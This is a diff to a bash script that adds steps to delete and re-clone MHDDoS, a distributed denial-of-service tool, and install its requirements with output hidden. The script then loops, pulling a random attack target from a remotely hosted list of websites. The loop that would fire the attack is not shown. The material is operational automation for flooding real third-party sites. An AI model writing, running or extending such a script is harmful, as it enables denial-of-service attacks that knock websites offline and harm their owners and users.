@@ -15,8 +15,17 @@ if [ ! -f /usr/bin/git ]; then
    sudo apt install git
 fi
 
+#Install latest version of MHDDoS
+cd~
+rm -rf MHDDoS
+git clone https://github.com/MHProDev/MHDDoS.git
+cd MHDDoS
+pip install -r requirements.txt > /dev/null #(no output on screen)
+
 while true
 do
+
+
 
 ## Get random target from list of sites
 site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
